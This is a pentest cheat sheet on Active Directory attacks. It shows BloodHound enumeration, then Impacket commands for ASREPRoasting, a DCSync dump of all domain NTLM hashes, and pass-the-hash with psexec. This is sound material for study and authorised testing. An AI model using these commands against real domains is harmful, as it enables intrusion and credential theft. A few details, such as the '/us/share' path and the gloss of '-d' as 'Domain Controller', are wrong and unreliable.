# :red_circle: BloodHound
______
>BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.

**Install from [git](https://github.com/fox-it/BloodHound.py) or:**
```bash
pip install bloodhound
apt install neo4j
apt install bloodhound
```

**Basic enum using valid AD credentials:**

```bash
bloodhound-python -d $DOMAIN -u $USER -p $PASSWORD -gc $HOST.$DOMAIN -c all -ns $IP_ADDRESS
#-d: Domain Controller
#-gc: Global Catalog
#-c: Which information to collect
#-ns: Alternative name server to use for queries
```  

**Using this information:**

Once we get the .json files, we need to open bloodhound in order to analyze the data:

```bash
cd /us/share/neo4j/bin/ && ./neo4j console start
#Now run in another terminal window:
bloodhound --no-sandbox
```

We can select various queries, of which some very useful ones are:
- Shortest Paths to High Value Targets
- Find principles with DCSync Rights


`GetChangesAll:` If we see that a user have GetChangesAll privileges to the
domain means that the account has the ability to request replication data
from the domain controller, and gain sensitive information such as user hashes:

**Check for disable Kerberos pre-auth:**

It's worth checking if Kerberos pre-authentication has been disabled for this account, which means it is vulnerable to ASREPRoasting. We can check this using a tool such as Impacket's GetNPUsers:

```bash
GetNPUsers.py $DOMAIN/$USER -request -no-pass -dc-ip $IPADDRESS
```

We obtain the TGT ticket for the $USER and we can use Hashcat or JTR to obtain the plaintext password.


In order to leverage the GetChangesAll permission, we can use Impacket's [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to perform a DCSync attack and dump the NTLM hashes of all domain users:

```bash
secretsdump.py -dc-ip $DCIPADDRESS $DOMAINNAME/$USER:$PASSWORD@$DCIPADDRESS
```

**Privesc using Administrator NTLM Hash:**

Using the default domain administrator NTLM hash, we can use this in a PTH attack to gain elevated access to the system. For this, we can use Impacket's psexec.py:

```bash
psexec.py $DOMAINNAME/administrator@$DCIPADDRESS -hashes $NTMLhash:$NTLMhash
```
